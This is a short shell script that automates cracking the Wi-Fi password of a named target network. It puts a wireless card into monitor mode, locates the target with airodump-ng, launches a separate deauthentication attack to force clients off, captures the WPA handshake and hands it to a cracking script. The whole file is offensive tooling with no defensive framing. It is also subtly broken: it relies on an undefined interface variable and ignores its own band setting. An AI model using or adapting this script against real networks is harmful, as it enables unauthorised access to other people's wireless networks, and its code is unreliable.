#!/bin/sh
band='2.4G' #2.4G or 5G
wifi_card_name="wlo1"
packet_file_name="wifi"
target_SSID="Xiao"
echo "this is a script that brute-force to get wifi password"
rm log/*
# sudo iwconfig $wifi_card_name power on
# sudo iwlist $wifi_card_name channel
# sudo iwconfig {interface} freq {frequency, ex. "5.00G"}
airmon-ng check kill
ifconfig $interface down
ifconfig $interface up

airmon-ng start $interface
sleep 3s
if [ "$band" == '5G' ]; then
    echo "aiming 5G wifi"
    band="a"
elif [ "$band" == '2.4G' ]; then
    echo "aiming 2.4G wifi"
    band="b"
fi
result=$(airodump-ng --band b $wifi_card_name | tee /dev/tty | grep -i -m 1 $target_SSID)
echo $result
target_BSSID=$(echo "$result" | awk '{print $1}')
channel_num=$(echo "$result" | awk '{print $6}')
echo "target_BSSID $target_BSSID"
echo "channel_num $channel_num"

iwconfig $wifi_card_name channel $channel_num
konsole -e sudo sh wifi_deAuth_attack.sh $target_BSSID $wifi_card_name &

airodump-ng -c $channel_num --bssid $target_BSSID -w ./log/$packet_file_name $wifi_card_name | \
tee /dev/tty | grep -i -m 5 EAPOL && \
kill $(pgrep konsole | awk 'NR==2 {print $1}')

konsole -e sudo sh wifi_crack.sh $target_BSSID $packet_file_name &
